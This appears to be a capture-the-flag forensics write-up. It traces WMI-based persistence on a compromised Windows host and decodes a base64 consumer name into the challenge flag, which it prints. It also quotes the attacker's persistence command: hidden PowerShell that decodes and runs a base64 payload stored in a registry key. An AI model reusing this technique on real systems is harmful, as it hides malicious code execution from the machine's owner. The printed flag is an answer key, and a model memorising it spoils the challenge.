# Autoruns 2

Attackers compromised this Windows host and riddled it with persistence mechanisms in a see-what-sticks effort to maintain a foothold on the system. Can you find the second persistence mechanism?

Intermediate 
200 points 


Looking at autoruns, we see a WMI entry that has notepad.exe with a base64 encoded name.
![the encoded name](/Images/autorun_2.png)


`\\EC2AMAZ-QJLIUMV\ROOT\subscription:CommandLineEventConsumer.Name="bGV2ZWxlZmZlY3R7YW5vdGhlcl9vbmVfYml0ZXNfdGhlX2R1c3R9"`

decoding this from base64, we get our flag.

`flag: leveleffect{another_one_bites_the_dust}`


`/c start /min "" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\DiskCleaner).bGV2ZWxlZmZlY3R7aXRzX2JlY29taW5nX3NlbGZfYXdhcmV9)))`
